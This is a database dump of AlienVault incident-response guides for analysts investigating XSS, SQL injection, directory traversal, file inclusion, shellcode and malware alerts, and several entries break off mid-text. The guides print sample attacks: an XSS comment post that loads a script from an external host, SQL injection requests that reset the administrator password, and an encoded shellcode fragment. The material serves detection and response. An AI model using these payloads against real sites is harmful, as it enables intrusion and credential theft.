(10115, '0', 'AlienVault Incident Response: Exploit / Cross Site Scripting', '{SECTION INTRODUCTION}\nThis event indicates the detection of a possible Cross-Site Scripting exploit. XSS is an attack method against scripting languages served in HTML content from web servers. The most common form of XSS is where a website will accept input from a user that includes javascript commands, and then display that same content to other users in a format that causes the code to be executed by their web browser. This attack method allows an attacker to use a trusted site to take control of the browser of anyone viewing that site, with effects ranging from tricking them into loading content they believe to be provided by the trusted site, or delivering an exploit against the browser itself to take control of the client machine.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nThe creation of a Cross-Site scripting is, in its simplest form, detected by the prescence of javascript (and the accompanying &lt;SCRIPT&gt; tag) in an HTTP POST request - as script content is entered into a form field on a web application. As with all text data entered  over a network connection however, there are many ways of encoding the text to avoid detection by systems (escape codes, unicode, etc). \n\nConversely, detecting a site that has been compromised with cross-site scripting is far more difficult, since the complexities (and uniqueness) of web content require some context about the application itself, to identify a &lt;SCRIPT&gt; tag out of place. Modern websites may draw in content from numerous hosts (aside from the one the master page is served from) to assemble the final page the user sees, and the importing of external javascript files is commonplace. Sites compromised via javascript may draw in script references from external sources, which may already be known to the OTX reputation engine as serving malicious code.\n\nReferencing an external file is not always required however, and even a small amount of javascript can achieve much - only two statements are required to access a user''s authentication cookie for the infected site, and transmit it to a hostile third part.\n\nA simple XSS attack, via posting to a comment form on a website, may look something similar to the following\n\n	POST /forumcomment.php HTTP/1.1\n	Host: www.genericforums.org\n	Content-Type: application/x-www-form-urlencoded; charset=utf-8\n	Content-Length: 100\n	\n	name="nobody"&amp;email="nobody@nobody.org"&amp;comment=&lt;SCRIPT src="http://edshaisc.ru/usha/1.js"&gt;&lt;/SCRIPT&gt;\n	\nIn this simple example, when another user views the comment posted here, their browser will download and execute the javascript at "http://edshaisc.ru/usha/1.js".\n\nBecause of the range of web technologies today, and the numerous ways in which they can be implemented, it is not unexpected to see some websites that send back &lt;SCRIPT&gt; tags back to the server, in the course of normal usage of the client (though this does not speak highly of the security of the site itself). As methods of injecting javascript into websites evolve, so do the methods of detection, and inevitably some measure of direct analysis of the javascript that has triggered the detection may be necessary to fully investigate a potential cross-site scripting alert.\n\n{IF $DSTIP IS IN HOSTGROUPS}\nThe system at (($DSTIP)) is part of Host Group (($HG_NAME)), indicating that it is likely a known and accounted for system, running an officially supported application. This may increase the likelihood of this event indicating a potential exploit, and the significance of it if this is the case. Conversely, systems with large numbers of users are inevitably more likely to produce more false-positive results due to the range of users and client software accessing this system.\n{ENDIF}\n{ELSE}\nThe system at (($DSTIP) is not listed in any hostgroups. If this system is located on the internal network, it may be a ''shadow IT'' system, provisioned without proper tracking and governance. Although this means that the system will have fewer users and will be less critical to business continuity, it increases the likelihood of the system potentially remaining unpatched against emerging vulnerabilities, and the potential for an attacker to go unnoticed on the system for a greater period of time.\n{ENDELSE}\n \nExamining other traffic around the same time as this event from (($SRCIP)) is recommended to determine if this event occurred in isolation, or may be a false positive within a section of legitimate usage - evidence of (($SRCIP)) probing and exploring other systems using the same techniques and connection types, or a series of different attack methods to the same target, may provide the context to determine if an actual threat is present.\n\n{IF $SRCREPACTIVITY NOT EMPTY}\n  Source host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange.

This script is the payload that will be executed by victims visiting the compromised website, and is likely controlled by the same person carrying out the attack.\n\nXSS attacks will often include obfuscated scripts to avoid simple detection and interpretation of the payload''s purpose. While de-obfuscation of javascript is beyond the scope of this document, there are many references and toolkits for this purpose available on the internet. There are numerous methods of obfuscation, and identification of the particular method may require experimentation with several tools to achieve success.\n\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nCross Site Scripting is a software vulnerability introduced by insecure programming practises in the sanitization and parsing of User Input. Although certain technologies exist which are designed to detect and intercept requests to web applications that appear to contain Cross Site Scripting, these can be bypassed with time and determination.  The impact of a Cross Site Scripting vulnerability can be affected greatly by visibility of the data field that is injectable, and the authentication context in which it occurs: an anonymous user being able to XSS inject a data field that will later be viewed by a system administrator can grant the attacker access to the whole system, conversely, a field that will be seen by all other anonymous users can potentially be used to compromise the machines of every user who visits server).\n\nRemoval of the injected script commands from the application''s database to prevent any further compromise of clients viewing it, but any permanent rectification of the issue will require changes in the underlying code of the web application itself. \n\nIn general, Cross-Site Scripting does not compromise the host that the application is running from (though there are scenarios where this is within the realm of possibility), instead the web application is used only as a vector to deliver malicious code to other client systems. Information gathered via a cross-site scripting attack (e.g. an active authentication cookie for an administrator) can then be used to compromise the web application itself and from there move onward onto other targets - successful attacks operate over multiple stages of execution of multiple techniques.\n\n{ENDSECTION}', '2012-11-08', '0', ''),
(10116, '0', 'AlienVault Incident Response: Exploit / Dns', '{SECTION INTRODUCTION}\nThis event indicates a possible exploit against either the Domain Name Server protocol, against a server providing name services via this protocol, or a client system using this protocol to resolve names over a TCP/IP network. DNS operates exclusively over port 53 (both UDP and TCP). The DNS system is an integral part of establishing identity and connection over TCP/IP, and although many older attacks worked by granting an attacker access to the system running the DNS Service, modern attacks against it commonly work to redirect connections to alternate hosts, or access naming information not normally available outside of the target network.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nThe DNS system presents certain issues when analyzing possible exploits against it - as a critical service required for the operation of most TCP/IP services, DNS traffic can appear highly unusual at first glance, since normal client activity can cause requests from DNS servers in order to resolve names for that client. For example, a host infected with malware will attempt to resolve the hostname for a malware command and control server, causing a DNS server to query the authoritive DNS server for the C&amp;C domain (which may also be flagged as on the same hostile remote  network as the C&amp;C server), an event that is easy to mistake as an indicator of the DNS Server itself being compromised.\n\nAttacks against DNS come in three major classes:\n\na) Exploitation of the DNS Server software itself, to gain control of the host it operates from: in this scenario the DNS software is merely a vector for gaining access to the target host, like any other vulnerable system. However an attacker may still use the server''s status as a trusted DNS source to redirect clients.\n\nb) Redirection of clients by the creation of false name resolutions: here the DNS server will be manipulated into returning different IP addresses for existing hostnames - in many cases, to redirect clients from a known, trusted system (such as a mail or application server), to a hostile remote system, to capture authentication credentials or manipulate users into executing malicious content.\n\nc) enumeration of DNS data: since a DNS server effectively contains the list of most (if not all) active systems on a network, obtaining the information from it can provide valuable reconnaisance information for locating future targets to attack.\n\n{IF $SRCIP IS IN NETWORKS}\nMany DNS attacks can be difficult to differentiate from traffic between two legitimate DNS servers.

(10118, '0', 'AlienVault Incident Response: Exploit / Directory Traversal', '{SECTION INTRODUCTION}\nThis event indicates a possible incidence of a Directory-Traversal exploit. Directory Traversal is a method of forcing a software service to retrieve files and information outside of its base directory and access files on the the system that cannot normally be retrieved by the service. These exploits principally target web server software, which serve content from a base directory on the system (e.g. /var/www on many Apache servers) that contains files to be served over the web server. Via directory traversal however, the server can be tricked into retrieving files from elsewhere on the system, such as configuration files containing database credentials, etc.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nDirectory Traversal allows an attacker to read information that would not normally be viewable remotely. A common use of this attack method is to read configuration files for web applications that contain access credentials (e.g. for the backend database the application operates from).\n\nTraditionally directory traversal attacks work against how a webserver interprets URI''s requested from it, to locate files to deliver from the server''s local filesystem (e.g. the use of the ''..'' to indicate ''parent directory of'' in a URI, to refer to files outside the directories normally accessible via the webserver. \n\nApplications that accept input from the user may also be susceptible to directory traversal attacks, where the application fails to sanitize input from a user and allows symbols that are used in valid file paths to be used when locating a file on the system\n\nDirectory traversal events often indicate the use of a web vulnerability scanner, due to the numbers of attacks using this method that were possible in earlier versions of common webservers, they can reliably detect older versions of webserver software.\n\n{IF $SRCIP IS IN NETWORKS}\nThe source host in this event, (($SRCIP)) is a host on your local network.

Since FTP software allows users on the system to log in using their own account credentials and access files using those same access rights, FTP software commonly runs as an administrative user on the server and successful compromise will allow an attacker to execute malicious code as an adminstrative user.\n\n{ENDSECTION}\n\n{SECTION ANALYSIS}\n\n{IF $SRCIP IS IN NETWORKS}\n\n{ENDIF}\n\n{IF $SRCUSER NOT EMPTY}\n\n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\nSource host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange.

(10120, '0', 'AlienVault Incident Response: Exploit / File Inclusion', '{SECTION INTRODUCTION}\nThis event indicates that a possible File-Inclusion attack has been detected by a system or security control.. File inclusion vulnerabilities exist where an application (usually a web application) accesses certain files based on user input - when that input is not sanitized, the application can access, retrieve and even execute other files on the system. These vulnerabilities are a common way of compromising web applications and repurposing them to infect other visitors to the same site. \n\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nA common form of exploiting web applications via file inclusion vulnerabilities is to use the application''s built-in file upload features, and then convince the application to execute the content in that file. An application may allow upload of image files (and disallow anything with a file extension that is not an image type), but may not actually check the content of the file - so a PHP code file can be uploaded as file.jpg, and a file inclusion vulnerability exploited to cause the application to access and execute that code now present on the server''s filesystem.\n\nAlthough web applications are the most common target for file inclusion exploits, they are not exclusive to them - indeed any application written in a script or interpretted language can be vulnerable to file inclusion - since most support the loading and execution of new files during runtime. (Compiled applications may also execute new code during their runtime, but this is done via code injection methods, a more complicated process than file inclusion).\n\nThe file that gets included in a file inclusion attack does not necessarily have to be a malicious payload - it may also be a file that contains other sensitive information on the server that an attacker would not otherwise be able to access (such as a configuration file containing passwords to the application''s database server)\n\nAs with all successful attacks against software, a complete attack will consist of two portions - the exploit itself (input to the software that causes the undesired behavior) and the payload (the file that is included) - verifying a legitimate file inclusion attack often resides on determining the content of the file that is included - if this file is a malicious payload (or additional exploit that must operate locally on the target server to be effective) it will have been uploaded by the attacker before the exploit is triggered.\n\n{IF $DSTIP IS IN HOSTS}\nThe system at (($DSTIP)) is a host listed in inventory, indicating that it is likely a known and accounted for system, running an officially supported application. This may increase the likelihood of this event indicating a potential exploit, and the significance of it if this is the case. Conversely, systems with large numbers of users are inevitably more likely to produce more false-positive results due to the range of users and client software accessing this system.\n{ENDIF}\n{ELSE}\nThe system at (($DSTIP) is not listed in any hostgroups. If this system is located on the internal network, it may be a ''shadow IT'' system, provisioned without proper tracking and governance. Although this means that the system will have fewer users and will be less critical to business continuity, it increases the likelihood of the system potentially remaining unpatched against emerging vulnerabilities, and the potential for an attacker to go unnoticed on the system for a greater period of time.\n{ENDELSE}\n\nAs with almost every attack against a web application, examination of the arguments passed to the application via the URI and HTTP Headers (GET and POST fields) is a critical piece of analysis - comparison to values from normal usage of the application is often the key starting point - the prescence of actual file names (possibly without an extension) is often an obvious clue that a valid exploit is being attempted.\n\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nFile inclusion attacks can have a wide range of possible effects, they may be used to compromise the application itself and extract protected information from it, or to execute a follow-on attack that must be executed locally to exploit the system the application runs from. They may also be used to distribute malicious content via an otherwise trusted system, to distribute malware to the users of the system itself. Once a successful file inclusion attack is confirmed, analysis of the payload and its target is always the next step to determine the scope of who the attack will affect.\n\nFile Inclusion vulnerabilities are a vulnerability introduced by insecure programming practises, but it may be possible to limit the impact of their exploitation by careful configuration of the system itself. If users of an application are allowed to upload files to the application, the application should be forbidden from executing files from the upload location (how this is achieved will vary greatly depending upon the language the application is written in, the webserver it is served via, and the operating system the webserver resides upon).\n\n{ENDSECTION}', '2012-11-08', '0', ''),

(10126, '0', 'AlienVault Incident Response: Exploit / Sql Injection', '{SECTION INTRODUCTION}\nThis event represents the possible occurence of an attack intended to gain elevated access to a Database. SQL Injection attacks attempt to inject database commands (Structured Query Language) to retrieve unauthorized information or take control of the database server itself.  Typically a SQL Injection attack will not connect to the database itself, but to a system that accesses information from that database. e.g. a SQL injection attack may be send in a request to a web server that access a particular database, additional SQL commands will be injected into the webserver''s normal access to the database and retrieve additional information that was not intended to be visible to an end-user (such as administrator passwords, personal information or other sensitive records).\n\nSQL Injection in practise, is the result of user input being used to construct SQL queries to a database to return data (usually as part of a Web Application); when that user input contains SQL commands that are not removed successfully by the applications, those additional commands become part of the query send to the database.\n\nDue to the wide range of systems that rely on database systems for their backend data storage, SQL Injection attacks may be found in many protocols and applications, but by far the greatest number are located in web applications and HTTP traffic.\n\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nSQL Injection commands have a high false-positive rate due to the nature of the applications that access a database via SQL: what looks like a malicious SQL command for one application, may be completely normal SQL activity for another. There are however some simple SQL injection methods that may be detected based on the construction of the SQL Query - although these attack attempts may not work, they may be detected - The attacker may then move on to more advanced methods that are not detected, but actually successly. This is why, when investigating a SQL Injection event, investigation of the rest of the activity between a suspected attacker and the target should be investigated as well for additional evidence.\n\nWhether the SQL Injection is detected ''on the wire'' from intrusion detection, or from the host in a log file, the first goal is always to determine what was observed that caused the system to identify it as a potential SQL injection, and if that data represents a valid SQL Injection attempt.\n\nInevitably some knowledge of SQL is mandatory to investigate SQL Injection attacks, since although simple attacks such as this can easily be identified\n  \n		SELECT id from Users WHERE user=''bob'' OR 1=1 --'' AND password=''badpassword'' \n\n(In this case, the person has entered a the username as "bob'' OR 1=1 --"  .  What happens in this case is that the Database server evaluates the OR 1=1, meaning that all rows in the database will return true, and it will return the ID numbers of all users in the system. The double-dashes are a SQL comment that tells the database server to ignore the rest of the original command. This is easy to detect as a SQL injection due to the placement of the comment double-quotes to remove the rest of the query, and the commonly used ''OR 1=1''\n\nSQL is a complex and flexible language however and each database is designed differently; this following query is a SQL injection that could also be a perfectly valid query.\n\n	SELECT fieldlist\n        FROM table\n        WHERE field = ''anything'' OR ''x''=''x'';\n\nSince SQL Injection usually requires some experimentation with each target system before it is successful, the attempt that is detected, may not be the attempt that is successful. \n\nFinally, there are many SQL Injection techniques that take advantage of particular characteristics of specific database software, such as environment variables (in Microsoft SQL Server, these are indicated by values starting with @@) to force particular behavior from the database. \n\nUltimately, comprehensive investigation of SQL Injection events is not possible without a grounding in the many variants of the SQL language standard.\n\n{IF $DSTPORT IS "80"}\n  This event appears to be occuring over the HTTP protocol against a web application. Data may be passed to web applications via three mechanisms - as a URI Query String to a GET request (and less commonly as a PUT request), or as a POST request\n  \n  GET and POST include the data to be passed as arguments called Query Strings in the URI request sent to the server: a series of key-value pairs, seperated by semicolons, indicated by a question mark after the page URI being requested. Here''s an example GET request containing SQL Injection:\n  \n	GET /ProductDetails.aspx?Id=3;UPDATE Products SET ProductName = "hacked''--UPDATE users SET password=''hacked'' WHERE username=''administrator''"  HTTP/1.1\n	User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13	\n  \n  Because of the way URI''s must encode special characters to prevent possible misinterpretation of them by different systems, the potential SQL injection string may require some decoding before it is readable. Spaces in particular are often encoded in hexadecimal: e.g.\n  \n	UPDATE%20users%20SET$20password\n  \n  There are many other ways of encoding strings that result in strings that are not immediately human-readable, in particular use of Unicode (though this is beyond the scope of this guide).\n  \n  The POST method of passing data to a web application includes the arguments in the body of the request, encoding spaces as a ''+'', and delimiting fields with &amp;\n  \n	POST /ProductDetails.aspx HTTP/1.1\n	User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13\n	Content-Type: application/x-www-form-urlencoded\n	Content-Length: 115\n\n	Id=3&amp;UPDATE+Products+SET+ProductName+=+"hacked''--UPDATE+users+SET+password=''hacked''+WHERE+username=''administrator''"\n \n In many cases, as an attacker attempts to craft a valid SQL Injection query against a target web application, they will iterate through many queries that fail to produce the desired results, usually producing an HTTP Error code 500 (Internal Server Error) many times during the course of attacking the application - often to the same web page: a long stream of error 500 logs, interspersed with the occasional 302 (Success) code can be a strong identifier of SQL injection being attempted (either manually from a human operator, or if the speed of the logs is higher, an automated tool such as the SQLMAP injection testing framework).\n \n{ENDIF}\n  \n Examine other data coming from the source host, for evidence of variations of the same SQL request being made, as the attacker experiments with what data they can retrieve and insert into the database. Although there are many pre-written SQL injections for specifically vulnerable versions of web applications,  SQL injection against a web application requires no specialized tools beyond an HTTP client and is often performed manually by an attacker (as human intuition is often far more accurate than an automated tool with this attack method).\n  \nIf it is unclear as to whether the activity is truly a SQL Injection attack, compare the requests to a log from normal usage of the application and eliminate those requests  that are made in ordinary usage of the application first.\n\nAs always, compare what other activity the potential attacker''s system is performing on the network to look for additional evidence that an attack is in progress, or has succeeded.\n \nSQL Injection attacks are not always limited to reading and modifying the contents of a database, since many database systems include the ability to output content to a file on disk,  or even execute external programs. These are commonly executed via SQL functions called ''Stored Procedures'', which may be specific to a particular database or database system, and require assistance from the Database administrator or creator to explain the functionality of (since they are often custom-written).\n\nDepending on the contents of the database, attackers may only extract or modify a small amount of pertinant data (extracting or changing the password to a privileged account on the application) or if the desired target data resides in the database they may extract it directly (either directly from a query, or if possible, writing the data to a file that is reachable externally via the webserver), logs showing HTTP requests with an unusually large ''content-size'' value (the number of bytes returned to the client) are another strong piece of evidence for a successfull SQL Injection attack. \n\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nSQL Injection is a software vulnerability introduced by insecure programming practises in the sanitization and parsing of User Input. Although certain technologies which are designed to detect and intercept requests to web applications that appear to contain SQL Injection, these can be bypassed with time and determination.  The impact of a SQL injection vulnerability can be affected greatly by how the application, database and the account credentials used by each are configured. If multiple applications use the same account on the database server to access their respective data, then a compromise of one may compromise all. Certain features on database systems (such as the ability to write the results of a query to a file on disk, or execute external programs) may not be required for the needs of the systems running from the database server, and should be disabled where possible. \n\nSQL Injection can achieve a number of outcomes of benefit to the attacker - retrieving privileged information from the database (account passwords, credit card information, or any other applicable range of sensitive information), modifying information within the database (changing account credentials, modifying application configuration options) or using  the database software to execute malicious code (via stored procedures and file output). \n\nWhen SQL Injection is done via Query Strings, reconstructing what information was accessed is made simpler, via replaying the commands injected via those query strings, however if done via POST requests, webservers do not commonly log information passed via this method. Similarly, production database servers do not commonly log every query made against them (for performance reasons), but do maintain a limited ''rollback'' log to reverse changes made to the database. Rollback logs are however, usually limited to only the most recent changes, and require specialized tools and skills to examine.\n\nSince many enterprise web applications have the application and the database reside on seperate servers, artifacts of a successful compromise may reside on both systems (for example, if the database server is manipulated into writing a file to disk). Depending on the level of access to the database the account used to query the database has been granted, other applications and databases on the same server may also be considered compromised. \n\n{ENDSECTION}', '2012-11-08', '0', ''),

(10128, '0', 'AlienVault Incident Response: Exploit / Shellcode', '{SECTION INTRODUCTION}\nThis event indicates the possible transfer of shellcode to a system. Shellcode is not strictly an exploit method, but more often a method of delivery a malicious payload to a system after an exploit has been carried out. \n\nShellcode is a way of encoding machine language instructions, into a format that can be represented in ordinary character sets (ASCII, UNICODE) so it can be transferred via text data, to inject malicious code payloads into compromised software.\n\nFor example, a buffer overflow exploit may be used to cause the target system to start running code from a section of memory assigned for data storage; shellcode is the method in which the malicious code to be executed, is delivered to that data storage area and then executed by the compromised system.\n\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nSince shellcode is a method of transferring executable machine instructions to a target machine, comprehensive analysis of it requires some familiarity with the assembly language of the target system. Within OSSIM, most shellcode detection will be performed via the SNORT IDS, and decompiled down into machine code instructions. (this feature is accessed via the "ShellCode Analysis'' link next to the regular snort packet analysis section of the event view).\n\nInterpretting this automatic analysis requires specific knowledge of the assembly language syntax for the target cpu architecture, and is beyond the scope of this document. There are however some level of basic analysis that can be performed from this shellcode dissassembly.\n\nShellcode within a data stream, often has to be encoded in a format that can be represented as plain text (since the aspect of the software to be exploited, only accepts plain text as an input) and contains no NULL values (since a NULL usually indicates the end of a string field in software)\n\nA common encoding is escaped via hexadecimal bytes: e.g.\n\n	\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49" \n	"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56"\n	"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41"\n\nA common encoding against web clients to inject code via javascript vulnerabilities is percent encoding:\n\n	"&amp;#89;&amp;#e2;&amp;#da;&amp;#c1;&amp;#d9;&amp;#72;&amp;#f4;&amp;#58&amp;#50&amp;#59&amp;#49&amp;#49&amp;#49&amp;#49" \n	"&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#5;1&amp;#5a&amp;#56&amp;#54&amp;#58&amp;#33&amp;#30&amp;#56"\n	"&amp;#58;&amp;#34;&amp;#41;&amp;#50;&amp;#30;&amp;#41;&amp;#3;3&amp;#48&amp;#48&amp;#30&amp;#41&amp;#30&amp;#30&amp;#41"\n\nIf the disassembly is labelled as "couldn''t be analyzed", there is a high probability that the IDS signature itself is a false positive, as no valid machine code could be extracted from the data that triggered the event; without analyzing if the encoded text translates into executable text, false positives are always possible. Note that this only works if the shellcode is written for the X86 CPU architecture - if the event notes that the shellcode is for a different architecture (such as SPARC), it cannot be decompiled in this way.\n\nIf successfully disassembled, a listing of the resulting code is produced.. Here''s an example snippet:\n\n	int bind (\n	SOCKET s = 66;\n	struct sockaddr_in * name = 0x00417269 =&gt;\n	struct = {\n	short sin_family = 2;\n	unsigned short sin_port = 42247 (port=1957);\n	struct in_addr sin_addr = {\n	unsigned long s_addr = 0 (host=0.0.0.0);\n	};\n\nIn this example, we have a clue in this snippet of code - the string ''0.0.0.0'', which is a special IP address that means "any address", or more often "Any interface" when configuring software as to what address on the system it is running on, that it should listen for new connections on. Similarly, shellcode may reference running specific commandline executables, modifying system files (such as /etc/passwd on unix systems).\n\nThe transmission of shellcode is largely unique to the transfer of malicious payloads as part of an exploitation attempt, and may indicate an exploit that was not otherwise detected. Shellcode is not limited to communication with network service software, and may be present within files (such as malicious PDF documents) to include a binary executable payload within an otherwise text-only format.\n\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nShellcode is a method of injecting malicious code into exploited software processes, to perform the initial compromise of a target system. Shellcode is not an exploit by itself however.\n\nSince Shellcode injects code into existing processes, which then carry out the instructions within, logs about what was performed by the shellcode can be quite limited (or non-existantt); the commands executed within a shellcode payload can provide the vital first step in assembling a forensic timeline of a compromised system. Since the size and functionality of a shellcode payload is often extremely limited, these commands are usually quite few in number: commonly downloading an executing a rootkit, opening a reverse shell, or changing an account password to a known value.)\n\n{ENDSECTION}', '2012-11-08', '0', ''),

(10130, '0', 'AlienVault Incident Response: Exploit / Windows', '{SECTION INTRODUCTION}\nThis event indicates that a possible attack against the Windows Operating System has been detected by a system or security control. A great percentage of the exploits in this category will target the windows file-and-print sharing protocol: Server Message Block (SMB) or the windows Web Server software - Internet Information Services. Both of these services operate as part of the operating system itself and successful compromise can grant system-level access to an attacker.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\n\nExploits in this category are targetted at the Windows OS itself (or software that ships directly as part of the Windows OS, such as the Internet Information Services webserver). A great percentage of windows exploits target the Server Message Block protocol, over which the great majority of windows networking functions travel. SMB is the core of Windows File and Print sharing, but includes a Remote Procedure Call, which includes the functionality for authentication and remote management.  Since this protocol is absolutely required to enable most of the functionality present in Windows domains, it is a popular target for vulnerability research, since successful exploitation of the protocol will often grant system-level access on the target system.\n\n{IF $SRCIP IS IN NETWORKS}\nThe source host for this event (($SRCIP)) is a host located on your network. SMB Exploits often make calls to RPC functions that are normal for administrative systems (such as a domain controller) but dangerous from other systems. If (($SRCIP)) is a domain controller for your windows domain, there is a high chance this event is a false positive.\n\n{IF $DSTIP IS IN NETWORKS}\nThe destination host (($DSTIP)) is a host located on your network, and this event may be a false positive from legitimate domain controller traffic  from (($SRCIP)), assuming that (($DSTIP)) is a member of the same domain\n{ENDIF}\n\n{ENDIF}\n\n{IF $DSTIP NOT IN NETWORKS}\nIt is uncommon for the SMB protocol to be used to communicate with systems outside of a local network via an untrusted network such as the internet, yet this event seems to indicate this is happening.

Exploits commonly are used to deliver malicious code or commands to the victim system (''the payload''), but may also cause the system to disclose restricted information to an attacker, or merely to crash.\n\nDetection of Exploits is not perfect, since small changes to an exploit can render existing systems incapable of detecting it, and the patterns that indicate an exploit may also occur in legitimate activity. Since detection methods are not perfect, events in this category may experience false positives and false negatives and should never be taken at face value until investigated directly.\n\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nAll exploit events should be examined to determine if the event is a false positive. Real attacks rarely trigger only a single signature and activity on the source and destination systems around the same time as this event should be examined to give additional context to this event.

(10158, '0', 'AlienVault Incident Response: Malware', '{SECTION INTRODUCTION}\nMalware has been detected, either running on a system, being transferred over the network, or communicating with a command-and-control system. \n{ENDSECTION}\n\n{SECTION ANALYSIS}\nBegin by looking at the individual events that have been logged that triggered this alarm and the KDB article for the rule itself to understand what malware is indicated. Researching the known behavior and indicators of this piece of malware will be vital to investigating this alarm. \n\nSome malware is more difficult to identify than others, and some rules can only provide a ''best-guess'' detection that a particular piece of malware is active (since malware authors release new versions regularly) - rules are assigned a Reliability Score (out of 10) as a guide, this alarm''s reliability level is (($ALARMRELIABILITY)).\n\nWhile In general, attacks are launched from a source machine (($SRCIP)) against a destination machine (($DSTIP)), there are some exceptions to this rule however - always consider the content of the events in the Alarm first. This is particularly important for rules that detect Command-And-Control traffic from an infected machine - in this particular case, the source machine  is compromised, and communicating to the command and control host at the destination.\n\n{IF $SRCIP IS IN NETWORKS}\n(($SRCIP)) is a system on your network and may be listed in Inventory. If this Alarm refers to a particular piece of software, be sure to validate that this software is installed, running, and authorized on (($SRCIP)).  \n\nInvestigation of this system for the prescence of the listed malware is a priority, and on-host detection tools should be used to validate the prescence of and remove the listed malware (there may be other infections on the system as well, also installed by the initial malware installation)\n\nOnce a system is compromised by malware, it is good practise to consider all information and access credentials located on the system compromised as well; the system may well have already been used to advance onto other systems on the network. All further activity from this host (($SRCIP)) should be inspected for evidence of the attacker moving on to other systems. \n{ENDIF}\n\n{IF $SRCUSER NOT EMPTY}\nLike all software on a multiuser system, malware must run under an account. Anything this account has access to may likely be compromised by this malware, not only on (($SRCIP)) but on any other system this account has access to. Changr access credentials for (($SRCUSER)) immediately, and investigate for any unusual activity from (($SRCUSER)) on the network \n{ENDIF}\n\n{IF $SRCIP NOT IN NETWORKS}\n(($SRCIP)) is not known to be on the local network. If this alarm indicates a delivery of malware over a network channel, first establish if this remote host belongs to a network your organization legitimately does business with first. You may have a responsibility to report an infection of their systems to them. Persistent attackers will used trusted channels such as existing business partners to gain access to their targets via.\n{ENDIF}\n\n{IF $DSTIP IS IN NETWORKS}\nSince the destination address is on the local network, this alarm indicates the active deployment of malware to your network. Either a worm is active, or a user is actively deploying malware (such as a Remote Access Trojan) to a remote system. Examine logs from (($DSTIP)) thoroughly.\n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\nSource host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange. The associated Reliability Score: (($SRCREPRELIABILITY)) /10 is an indicator \nof how many other organizations have seen malicious activity from this host.\n\n If the activity listed as occurring from this host matches the activity listed in this alarm, it is highly probable that this alarm indicates active malicious activity against your infrastructure.\n{ENDIF}\n\n{IF $DSTREPACTIVITY NOT EMPTY}\nSource host (($DSTIP)) is known to the reputation system, and has been observed as a source of (($DSTREPACTIVITY)) by subscribers to the Open Threat Exchange. The associated Reliability Score: (($DSTREPRELIABILITY)) /10 is an indicator \nof how many other organizations have seen malicious activity from this host.\n\n If the activity listed as occurring from this host matches the activity listed in this alarm, it is highly probable that this alarm indicates active malicious activity within your infrastructure.\n{ENDIF}\n\nMalware may be deployed by attackers, and then left for some time before the attacker returns to make us of it. Removal of it is paramount, but must be thorough. After identifying a successful deployment of a particular piece of non-trivial malware, efforts must be taken to identify the ''campaign'' behind the infection - Search for other systems infected with the same malware; especially if you detect them communicating to the same remote command and control server.\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\n\n{ENDSECTION}', '2012-11-08', '0', ''),
